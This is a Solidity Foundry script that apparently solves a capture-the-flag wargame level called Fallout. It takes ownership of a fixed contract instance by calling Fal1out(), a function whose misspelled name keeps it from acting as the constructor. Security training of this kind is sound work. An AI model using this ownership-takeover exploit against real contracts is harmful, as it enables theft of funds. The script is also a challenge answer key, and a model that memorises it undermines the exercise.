// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

/**
 * @title Challenge 02 Solution Script
 * @notice Call Fal1out() (typo in constructor name) to become owner
 */
contract FalloutSolution is Script {
    address constant INSTANCE = 0x01E64cF1C2DAD941D160f08C762994554490E68f;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        IFallout target = IFallout(INSTANCE);

        vm.startBroadcast(deployerPrivateKey);

        console.log("Owner before:", target.owner());
        
        // The "constructor" is actually a regular function due to the typo (Fal1out vs Fallout)
        target.Fal1out{value: 0.0001 ether}();
        
        console.log("Called Fal1out(), new owner:", target.owner());

        vm.stopBroadcast();
    }
}